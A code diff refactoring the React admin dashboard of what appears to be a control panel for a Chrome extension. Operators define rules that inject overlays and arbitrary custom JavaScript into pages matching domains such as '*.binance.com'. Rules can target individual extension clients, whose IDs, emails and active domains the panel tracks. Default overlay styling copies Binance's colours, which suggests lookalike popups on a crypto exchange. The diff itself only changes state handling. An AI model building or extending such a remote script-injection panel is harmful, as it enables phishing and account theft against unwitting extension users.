@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useRef } from 'react';
 
 export default function AdminDashboard() {
   const [activeTab, setActiveTab] = useState('rules'); // rules | editor | clients | messages | docs
@@ -9,7 +9,10 @@ export default function AdminDashboard() {
   const [messages, setMessages] = useState([]);
   const [stats, setStats] = useState({ totalClients: 0, onlineClients: 0, totalRequests: 0, rulesCount: 0 });
   const [loading, setLoading] = useState(true);
+  const [saving, setSaving] = useState(false);
   const [toast, setToast] = useState(null);
+
+  const hasInitializedRef = useRef(false);
 
   // Active rule being edited or previewed
   const [selectedRuleId, setSelectedRuleId] = useState(null);
@@ -52,8 +55,43 @@ export default function AdminDashboard() {
     setTimeout(() => setToast(null), 3500);
   };
 
-  // Fetch initial data
-  const fetchData = async () => {
+  const updateField = (field, value) => {
+    setFormData((prev) => ({ ...prev, [field]: value }));
+  };
+
+  const updateOverlay = (field, value) => {
+    setFormData((prev) => ({
+      ...prev,
+      overlay: { ...(prev.overlay || {}), [field]: value },
+    }));
+  };
+
+  // Poll clients, stats, and messages in background WITHOUT touching rules or active form inputs
+  const fetchClientsAndStats = async () => {
+    try {
+      const [clientsRes, msgRes] = await Promise.all([
+        fetch('/api/admin/clients'),
+        fetch('/api/admin/messages'),
+      ]);
+
+      const clientsData = await clientsRes.json();
+      const msgData = await msgRes.json();
+
+      if (clientsData.success) {
+        setClients(clientsData.clients || []);
+        setStats(clientsData.stats || {});
+      }
+
+      if (msgData.success) {
+        setMessages(msgData.messages || []);
+      }
+    } catch (err) {
+      console.error('Failed to refresh clients and stats:', err);
+    }
+  };
+
+  // Fetch initial data once on mount
+  const fetchInitialData = async () => {
     try {
       setLoading(true);
       const [rulesRes, clientsRes, msgRes] = await Promise.all([
@@ -66,33 +104,46 @@ export default function AdminDashboard() {
       const clientsData = await clientsRes.json();
       const msgData = await msgRes.json();
 
-      if (rulesData.success) {
+      if (rulesData.success && Array.isArray(rulesData.rules)) {
         setRules(rulesData.rules);
-        if (rulesData.rules.length > 0 && !selectedRuleId) {
+        if (!hasInitializedRef.current && rulesData.rules.length > 0) {
+          hasInitializedRef.current = true;
           const first = rulesData.rules[0];
           setSelectedRuleId(first.id);
           setFormData({
             id: first.id,
-            name: first.name,
-            domain: first.domain,
-            enabled: first.enabled,
-            priority: first.priority || 10,
+            name: first.name || '',
+            domain: first.domain || '',
+            enabled: first.enabled ?? true,
+            priority: first.priority ?? 10,
             targetClientId: first.targetClientId || '',
-            overlay: { ...first.overlay },
+            overlay: {
+              height: '50',
+              bg: '#0b0e11',
+              text: '#eaecef',
+              titleColor: '#f0b90b',
+              title: '',
+              message: '',
+              position: 'top',
+              closable: true,
+              customCss: '',
+              customJs: '',
+              ...(first.overlay || {}),
+            },
           });
         }
       }
 
       if (clientsData.success) {
-        setClients(clientsData.clients);
-        setStats(clientsData.stats);
+        setClients(clientsData.clients || []);
+        setStats(clientsData.stats || {});
       }
 
       if (msgData.success) {
-        setMessages(msgData.messages);
+        setMessages(msgData.messages || []);
       }
     } catch (err) {
-      console.error('Failed to load admin data:', err);
+      console.error('Failed to load initial data:', err);
       showToast('Error connecting to backend API', 'error');
     } finally {
       setLoading(false);
@@ -100,8 +151,8 @@ export default function AdminDashboard() {
   };
 
   useEffect(() => {
-    fetchData();
-    const interval = setInterval(fetchData, 8000); // Auto-refresh clients and stats every 8s
+    fetchInitialData();
+    const interval = setInterval(fetchClientsAndStats, 8000); // Periodic ping for clients & messages only
     return () => clearInterval(interval);
   }, []);
 
@@ -109,12 +160,24 @@ export default function AdminDashboard() {
     setSelectedRuleId(rule.id);
     setFormData({
       id: rule.id,
-      name: rule.name,
-      domain: rule.domain,
-      enabled: rule.enabled,
-      priority: rule.priority || 10,
+      name: rule.name || '',
+      domain: rule.domain || '',
+      enabled: rule.enabled ?? true,
+      priority: rule.priority ?? 10,
       targetClientId: rule.targetClientId || '',
-      overlay: { ...rule.overlay },
+      overlay: {
+        height: '50',
+        bg: '#0b0e11',
+        text: '#eaecef',
+        titleColor: '#f0b90b',
+        title: '',
+        message: '',
+        position: 'top',
+        closable: true,
+        customCss: '',
+        customJs: '',
+        ...(rule.overlay || {}),
+      },
     });
   };
 
@@ -144,7 +207,10 @@ export default function AdminDashboard() {
 
   const handleSaveRule = async (e) => {
     e?.preventDefault();
+    if (saving) return;
+
     try {
+      setSaving(true);
       const isNew = selectedRuleId === 'new' || !formData.id;
       const url = '/api/admin/rules';
       const method = isNew ? 'POST' : 'PUT';
@@ -156,15 +222,45 @@ export default function AdminDashboard() {
       });
 
       const result = await res.json();
-      if (!result.success) throw new Error(result.error);
+      if (!result.success) throw new Error(result.error || 'Failed to save rule');
 
       showToast(`Rule ${isNew ? 'created' : 'updated'} successfully!`);
-      await fetchData();
-      if (result.rule) {
-        setSelectedRuleId(result.rule.id);
+
+      const savedRule = result.rule;
+      if (savedRule) {
+        setSelectedRuleId(savedRule.id);
+        setFormData({
+          id: savedRule.id,
+          name: savedRule.name || '',
+          domain: savedRule.domain || '',
+          enabled: savedRule.enabled ?? true,
+          priority: savedRule.priority ?? 10,
+          targetClientId: savedRule.targetClientId || '',
+          overlay: {
+            height: '50',
+            bg: '#0b0e11',
+            text: '#eaecef',
+            titleColor: '#f0b90b',
+            title: '',
+            message: '',
+            position: 'top',
+            closable: true,
+            customCss: '',
+            customJs: '',
+            ...(savedRule.overlay || {}),
+          },
+        });
+
+        if (isNew) {
+          setRules((prev) => [savedRule, ...prev.filter((r) => r.id !== savedRule.id)]);
+        } else {
+          setRules((prev) => prev.map((r) => (r.id === savedRule.id ? savedRule : r)));
+        }
       }
     } catch (err) {
       showToast(err.message || 'Failed to save rule', 'error');
+    } finally {
+      setSaving(false);
     }
   };
 
@@ -175,13 +271,20 @@ export default function AdminDashboard() {
         method: 'DELETE',
       });
       const result = await res.json();
-      if (!result.success) throw new Error(result.error);
+      if (!result.success) throw new Error(result.error || 'Failed to delete rule');
 
       showToast('Rule deleted successfully');
-      await fetchData();
-      if (selectedRuleId === ruleId) {
-        setSelectedRuleId(null);
-      }
+      setRules((prev) => {
+        const remaining = prev.filter((r) => r.id !== ruleId);
+        if (selectedRuleId === ruleId) {
+          if (remaining.length > 0) {
+            handleSelectRule(remaining[0]);
+          } else {
+            handleNewRule();
+          }
+        }
+        return remaining;
+      });
     } catch (err) {
       showToast(err.message || 'Failed to delete rule', 'error');
     }
@@ -197,7 +300,7 @@ export default function AdminDashboard() {
         body: JSON.stringify({ id: rule.id, enabled: updated }),
       });
       const result = await res.json();
-      if (!result.success) throw new Error(result.error);
+      if (!result.success) throw new Error(result.error || 'Failed to toggle rule');
 
       setRules((prev) => prev.map((r) => (r.id === rule.id ? { ...r, enabled: updated } : r)));
       if (formData.id === rule.id) {
@@ -221,7 +324,7 @@ export default function AdminDashboard() {
       if (!result.success) throw new Error(result.error);
 
       showToast('Targeted message dispatched successfully!');
-      fetchData();
+      fetchClientsAndStats();
       setMsgForm((prev) => ({ ...prev, body: '' }));
     } catch (err) {
       showToast(err.message || 'Failed to dispatch message', 'error');
@@ -234,7 +337,7 @@ export default function AdminDashboard() {
       const result = await res.json();
       if (result.success) {
         showToast('Message deleted');
-        fetchData();
+        fetchClientsAndStats();
       }
     } catch (err) {
       showToast('Failed to delete message', 'error');
@@ -433,8 +536,8 @@ export default function AdminDashboard() {
                   <input
                     type="text"
                     className="form-input"
-                    value={formData.name}
-                    onChange={(e) => setFormData({ ...formData, name: e.target.value })}
+                    value={formData.name || ''}
+                    onChange={(e) => updateField('name', e.target.value)}
                     required
                   />
                 </div>
@@ -445,8 +548,8 @@ export default function AdminDashboard() {
                     type="text"
                     className="form-input"
                     placeholder="e.g. *.binance.com or *"
-                    value={formData.domain}
-                    onChange={(e) => setFormData({ ...formData, domain: e.target.value })}
+                    value={formData.domain || ''}
+                    onChange={(e) => updateField('domain', e.target.value)}
                     required
                   />
                 </div>
@@ -459,8 +562,8 @@ export default function AdminDashboard() {
                     type="text"
                     className="form-input"
                     placeholder="Leave empty for all visitors"
-                    value={formData.targetClientId}
-                    onChange={(e) => setFormData({ ...formData, targetClientId: e.target.value })}
+                    value={formData.targetClientId || ''}
+                    onChange={(e) => updateField('targetClientId', e.target.value)}
                   />
                 </div>
 
@@ -471,13 +574,8 @@ export default function AdminDashboard() {
                     className="form-input"
                     min="10"
                     max="100"
-                    value={formData.overlay.height}
-                    onChange={(e) =>
-                      setFormData({
-                        ...formData,
-                        overlay: { ...formData.overlay, height: e.target.value },
-                      })
-                    }
+                    value={formData.overlay?.height || '50'}
+                    onChange={(e) => updateOverlay('height', e.target.value)}
                   />
                 </div>
               </div>
@@ -490,24 +588,14 @@ export default function AdminDashboard() {
                     <input
                       type="color"
                       className="color-picker"
-                      value={formData.overlay.titleColor}
-                      onChange={(e) =>
-                        setFormData({
-                          ...formData,
-                          overlay: { ...formData.overlay, titleColor: e.target.value },
-                        })
-                      }
+                      value={formData.overlay?.titleColor || '#f0b90b'}
+                      onChange={(e) => updateOverlay('titleColor', e.target.value)}
                     />
                     <input
                       type="text"
                       className="form-input"
-                      value={formData.overlay.titleColor}
-                      onChange={(e) =>
-                        setFormData({
-                          ...formData,
-                          overlay: { ...formData.overlay, titleColor: e.target.value },
-                        })
-                      }
+                      value={formData.overlay?.titleColor || '#f0b90b'}
+                      onChange={(e) => updateOverlay('titleColor', e.target.value)}
                     />
                   </div>
                 </div>
@@ -518,24 +606,14 @@ export default function AdminDashboard() {
                     <input
                       type="color"
                       className="color-picker"
-                      value={formData.overlay.bg}
-                      onChange={(e) =>
-                        setFormData({
-                          ...formData,
-                          overlay: { ...formData.overlay, bg: e.target.value },
-                        })
-                      }
+                      value={formData.overlay?.bg || '#0b0e11'}
+                      onChange={(e) => updateOverlay('bg', e.target.value)}
                     />
                     <input
                       type="text"
                       className="form-input"
-                      value={formData.overlay.bg}
-                      onChange={(e) =>
-                        setFormData({
-                          ...formData,
-                          overlay: { ...formData.overlay, bg: e.target.value },
-                        })
-                      }
+                      value={formData.overlay?.bg || '#0b0e11'}
+                      onChange={(e) => updateOverlay('bg', e.target.value)}
                     />
                   </div>
                 </div>
@@ -546,24 +624,14 @@ export default function AdminDashboard() {
                     <input
                       type="color"
                       className="color-picker"
-                      value={formData.overlay.text}
-                      onChange={(e) =>
-                        setFormData({
-                          ...formData,
-                          overlay: { ...formData.overlay, text: e.target.value },
-                        })
-                      }
+                      value={formData.overlay?.text || '#eaecef'}
+                      onChange={(e) => updateOverlay('text', e.target.value)}
                     />
                     <input
                       type="text"
                       className="form-input"
-                      value={formData.overlay.text}
-                      onChange={(e) =>
-                        setFormData({
-                          ...formData,
-                          overlay: { ...formData.overlay, text: e.target.value },
-                        })
-                      }
+                      value={formData.overlay?.text || '#eaecef'}
+                      onChange={(e) => updateOverlay('text', e.target.value)}
                     />
                   </div>
                 </div>
@@ -575,13 +643,8 @@ export default function AdminDashboard() {
                 <input
                   type="text"
                   className="form-input"
-                  value={formData.overlay.title}
-                  onChange={(e) =>
-                    setFormData({
-                      ...formData,
-                      overlay: { ...formData.overlay, title: e.target.value },
-                    })
-                  }
+                  value={formData.overlay?.title || ''}
+                  onChange={(e) => updateOverlay('title', e.target.value)}
                   required
                 />
               </div>
@@ -591,13 +654,8 @@ export default function AdminDashboard() {
                 <textarea
                   className="form-textarea"
                   rows={3}
-                  value={formData.overlay.message}
-                  onChange={(e) =>
-                    setFormData({
-                      ...formData,
-                      overlay: { ...formData.overlay, message: e.target.value },
-                    })
-                  }
+                  value={formData.overlay?.message || ''}
+                  onChange={(e) => updateOverlay('message', e.target.value)}
                 />
               </div>
 
@@ -611,13 +669,8 @@ export default function AdminDashboard() {
                   className="form-textarea code-textarea"
                   rows={4}
                   placeholder="// e.g. console.log('Injected on domain:', window.location.hostname);"
-                  value={formData.overlay.customJs}
-                  onChange={(e) =>
-                    setFormData({
-                      ...formData,
-                      overlay: { ...formData.overlay, customJs: e.target.value },
-                    })
-                  }
+                  value={formData.overlay?.customJs || ''}
+                  onChange={(e) => updateOverlay('customJs', e.target.value)}
                 />
               </div>
 
@@ -627,19 +680,14 @@ export default function AdminDashboard() {
                   className="form-textarea code-textarea"
                   rows={3}
                   placeholder="#custom-sticky-popup { animation: fadeIn 0.4s ease; }"
-                  value={formData.overlay.customCss}
-                  onChange={(e) =>
-                    setFormData({
-                      ...formData,
-                      overlay: { ...formData.overlay, customCss: e.target.value },
-                    })
-                  }
+                  value={formData.overlay?.customCss || ''}
+                  onChange={(e) => updateOverlay('customCss', e.target.value)}
                 />
               </div>
 
               <div style={{ display: 'flex', gap: '12px', marginTop: '20px' }}>
-                <button type="submit" className="btn btn-primary" style={{ flex: 1 }}>
-                  💾 Save & Publish Configuration
+                <button type="submit" className="btn btn-primary" style={{ flex: 1 }} disabled={saving}>
+                  {saving ? '⏳ Saving & Publishing...' : '💾 Save & Publish Configuration'}
                 </button>
                 <button
                   type="button"
@@ -815,7 +863,7 @@ export default function AdminDashboard() {
                 All Chrome Extensions currently checking in with client ID, email, active domain, and ping status.
               </p>
             </div>
-            <button className="btn btn-secondary btn-sm" onClick={fetchData}>
+            <button className="btn btn-secondary btn-sm" onClick={fetchClientsAndStats}>
               ↻ Refresh Now
             </button>
           </div>
